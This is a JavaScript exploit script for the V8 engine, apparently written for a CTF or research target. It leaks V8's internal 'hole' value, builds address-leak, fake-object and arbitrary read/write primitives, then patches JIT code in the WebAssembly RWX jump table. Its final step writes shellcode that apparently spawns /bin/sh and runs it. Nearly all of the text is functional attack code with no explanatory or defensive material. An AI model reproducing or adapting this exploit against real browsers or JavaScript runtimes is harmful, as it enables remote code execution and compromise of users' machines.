var wasm_code = new Uint8Array([
  //{{WASM}}
]);

var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var { shell, arb_write, nop, nop2 } = wasm_instance.exports;

const FIXED_ARRAY_HEADER_SIZE = 8n;

var arr_buf = new ArrayBuffer(8);
var f64_arr = new Float64Array(arr_buf);
var b64_arr = new BigInt64Array(arr_buf);

function ftoi(f) {
  f64_arr[0] = f;
  return b64_arr[0];
}

function itof(i) {
  b64_arr[0] = i;
  return f64_arr[0];
}

function smi(i) {
  return i << 1n;
}


function gc_minor() { //scavenge
  for (let i = 0; i < 1000; i++) {
    new ArrayBuffer(0x10000);
  }
}

function gc_major() { //mark-sweep
  new ArrayBuffer(0x7fe00000);
}

function set_keyed_prop(arr, key, val) {
  arr[key] = val;
}

function leak_hole() {
  let store_mode = [];
  const IC_WARMUP_COUNT = 10;
  for (let i = 0; i < IC_WARMUP_COUNT; i++) {
    set_keyed_prop(arguments, "foo", 1);
  }
  set_keyed_prop(store_mode, 0, 1);
  set_keyed_prop(arguments, arguments.length, 1);
  let hole = arguments[arguments.length + 1];
  return hole;
}
const the = {};
var large_arr = new Array(0x10000);
large_arr.fill(itof(0xDEADBEE0n)); //change array type to HOLEY_DOUBLE_ELEMENTS_MAP
var fake_arr = null;
var fake_arr_addr = null;
var fake_arr_elements_addr = null;

var packed_dbl_map = null;
var packed_dbl_props = null;

var packed_map = null;
var packed_props = null;

function leak_stuff(b) {
  if (b) {
    let index = Number(b ? the.hole : -1);
    index |= 0;
    index += 1;

    let arr1 = [1.1, 2.2, 3.3, 4.4];
    let arr2 = [0x1337, large_arr];

    let packed_double_map_and_props = arr1.at(index * 4);
    let packed_double_elements_and_len = arr1.at(index * 5);

    let packed_map_and_props = arr1.at(index * 8);
    let packed_elements_and_len = arr1.at(index * 9);

    let fixed_arr_map = arr1.at(index * 6);

    let large_arr_addr = arr1.at(index * 7);

    return [
      packed_double_map_and_props, packed_double_elements_and_len,
      packed_map_and_props, packed_elements_and_len,
      fixed_arr_map, large_arr_addr,
      arr1, arr2
    ];
  }
  return 0;
}

function weak_fake_obj(b, addr = 1.1) {
  if (b) {
    let index = Number(b ? the.hole : -1);
    index |= 0;
    index += 1;

    let arr1 = [0x1337, {}];
    let arr2 = [addr, 2.2, 3.3, 4.4];

    let fake_obj = arr1.at(index * 8);

    return [
      fake_obj,
      arr1, arr2
    ];
  }
  return 0;
}

function fake_obj(addr) {
  large_arr[0] = itof(packed_map | (packed_dbl_props << 32n));
  large_arr[1] = itof(fake_arr_elements_addr | (smi(1n) << 32n));
  large_arr[3] = itof(addr | 1n);

  let result = fake_arr[0];

  large_arr[1] = itof(0n | (smi(0n) << 32n));

  return result;
}


function addr_of(obj) {
  large_arr[0] = itof(packed_dbl_map | (packed_dbl_props << 32n));
  large_arr[1] = itof(fake_arr_elements_addr | (smi(1n) << 32n));

  fake_arr[0] = obj;
  let result = ftoi(large_arr[3]) & 0xFFFFFFFFn;

  large_arr[1] = itof(0n | (smi(0n) << 32n));

  return result;
}

function v8_read64(addr) {
  addr -= FIXED_ARRAY_HEADER_SIZE;

  large_arr[0] = itof(packed_dbl_map | (packed_dbl_props << 32n));
  large_arr[1] = itof((addr | 1n) | (smi(1n) << 32n));

  let result = ftoi(fake_arr[0]);

  large_arr[1] = itof(0n | (smi(0n) << 32n));

  return result;
}

function v8_write64(addr, val) {
  addr -= FIXED_ARRAY_HEADER_SIZE;

  large_arr[0] = itof(packed_dbl_map | (packed_dbl_props << 32n));
  large_arr[1] = itof((addr | 1n) | (smi(1n) << 32n));

  fake_arr[0] = itof(val);

  large_arr[1] = itof(0n | (smi(0n) << 32n));
}

function install_primitives() {
  for (let i = 0; i < 10; i++) {
    weak_fake_obj(true, 1.1);
  }
  for (let i = 0; i < 10000; i++) {
    weak_fake_obj(false, 1.1);
  }

  for (let i = 0; i < 10; i++) {
    leak_stuff(true);
  }
  for (let i = 0; i < 20000; i++) {
    leak_stuff(false);
  }
  console.log("[!] Waiting concurrent compilation...")
  var start = new Date().getTime() + 200;
  while (new Date().getTime() < start) { }
  console.log("[+] Continuing")

  gc_minor();
  gc_major();

  let leaks = leak_stuff(true);

  let packed_double_map_and_props = ftoi(leaks[0]);
  let packed_double_elements_and_len = ftoi(leaks[1]);
  packed_dbl_map = packed_double_map_and_props & 0xFFFFFFFFn;
  packed_dbl_props = packed_double_map_and_props >> 32n;
  let packed_dbl_elements = packed_double_elements_and_len & 0xFFFFFFFFn;

  let packed_map_and_props = ftoi(leaks[2]);
  packed_map = packed_map_and_props & 0xFFFFFFFFn;
  packed_props = packed_map_and_props >> 32n;
  let fixed_arr_map = ftoi(leaks[4]) & 0xFFFFFFFFn;
  let large_arr_addr = ftoi(leaks[5]) >> 32n;

  let dbl_arr = leaks[6];
  dbl_arr[0] = itof(packed_dbl_map | (packed_dbl_props << 32n));
  dbl_arr[1] = itof(((large_arr_addr + 8n) - FIXED_ARRAY_HEADER_SIZE) | (smi(1n) << 32n));

  let temp_fake_arr_addr = (packed_dbl_elements + FIXED_ARRAY_HEADER_SIZE) | 1n;

  let temp_fake_arr = weak_fake_obj(true, itof(temp_fake_arr_addr));
  let large_arr_elements_addr = ftoi(temp_fake_arr[0]) & 0xFFFFFFFFn;
  fake_arr_addr = large_arr_elements_addr + FIXED_ARRAY_HEADER_SIZE;
  fake_arr_elements_addr = fake_arr_addr + 16n;

  large_arr[0] = itof(packed_dbl_map | (packed_dbl_props << 32n));
  large_arr[1] = itof(fake_arr_elements_addr | (smi(0n) << 32n));
  large_arr[2] = itof(fixed_arr_map | (smi(0n) << 32n));

  fake_arr = weak_fake_obj(true, itof(fake_arr_addr))[0];

  temp_fake_arr = null;
}

function pwn() {
  console.log("[*] Leaking TheHole")
  the.hole = leak_hole();
  install_primitives();

  // compile functions
  nop();
  nop2();
  arb_write(0, 10n);
  shell();

  let shr_instruction_off = 0x81fn;
  let sub_instruction_off = 0x7bfn;
  let add_instruction_off = 0x823n;
  let shellcode_off = 0x887n;
  let tiering_budget_array_off = 0x8fn;

  let wasm_instance_addr = addr_of(wasm_instance);
  console.log("[*] wasm instance: 0x" + wasm_instance_addr.toString(16));

  let jump_table_start = v8_read64(wasm_instance_addr + 0x58n) & 0xffffffffn;
  jump_table_start += (v8_read64(wasm_instance_addr + 0x58n + 4n) & 0xffffffffn) << 32n;
  let shr_instruction_addr = jump_table_start + shr_instruction_off;
  let sub_instruction_addr = jump_table_start + sub_instruction_off + 2n;
  let add_instruction_addr = jump_table_start + add_instruction_off;
  let shellcode_addr = jump_table_start + shellcode_off;

  console.log("[*] RWX start: 0x" + jump_table_start.toString(16));
  console.log("[*] Shr instruction addr: 0x" + shr_instruction_addr.toString(16))
  console.log("[*] Sub instruction addr: 0x" + sub_instruction_addr.toString(16))

  let orig_sub_addr = v8_read64(wasm_instance_addr + tiering_budget_array_off) & 0xffffffffn;
  orig_sub_addr += (v8_read64(wasm_instance_addr + tiering_budget_array_off + 4n) & 0xffffffffn) << 32n;

  v8_write64(wasm_instance_addr + tiering_budget_array_off, sub_instruction_addr);
  nop(); // transform "subl rdx,0x35" in "subl rdi,0x7"
  v8_write64(wasm_instance_addr + tiering_budget_array_off, shr_instruction_addr - 4n);
  nop2(); // transform "shrq rcx, 24" in "shr r9d, 0x18"

  v8_write64(wasm_instance_addr + tiering_budget_array_off, add_instruction_addr - 4n);
  nop2(); // transform "addq rcx,r14" in "add ecx, esi"
  v8_write64(wasm_instance_addr + tiering_budget_array_off, add_instruction_addr - 4n + 2n);
  nop2(); // transform "add ecx, esi" in "add ecx,esi"
  v8_write64(wasm_instance_addr + tiering_budget_array_off, add_instruction_addr - 4n + 2n);
  nop2(); // transform "add ecx,esi" in "add eax, eax"

  v8_write64(wasm_instance_addr + tiering_budget_array_off, orig_sub_addr);

  const shellcode = [
    0x732f6e69622fb848n, 0x66525f5450990068n, 0x5e8525e54632d68n, 0x68736162000000n, 0xf583b6a5e545756n, 0x5n
  ];

  console.log("[+] Copying shellcode")
  v8_write64(wasm_instance_addr + 0x1fn, shellcode_addr);
  shellcode.map((code, i) => {
    arb_write(i * 4, code);
  })

  console.log("[+] Poping shell!!!")
  shell();
}

// pwn();
